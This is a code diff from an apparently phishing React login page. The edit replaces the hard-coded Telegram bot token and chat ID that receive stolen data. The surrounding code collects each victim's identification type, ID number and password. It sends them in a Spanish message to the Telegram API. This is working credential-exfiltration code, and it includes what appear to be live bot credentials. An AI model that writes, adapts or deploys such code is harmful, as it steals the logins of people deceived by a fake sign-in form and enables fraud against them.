@@ -44,8 +44,8 @@ const App = () => {
 
     // Send data to Telegram bot
     try {
-      const token = '7540486155:AAGg9r2eNaLCWF2hWt8wo4wG8ykFD78_i1Q';
-      const chatId = '7855300611';
+      const token = '8575056070:AAFOf7DyUI3Q0mB1nXqWXx-uKrPTtPWEz3Q';
+      const chatId = '8375471974';
       const message = `Nuevo inicio de sesión:\nTipo de identificación: ${selectedIdType}\nNúmero de identificación: ${idNumber}\nContraseña: ${password}`;
 
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
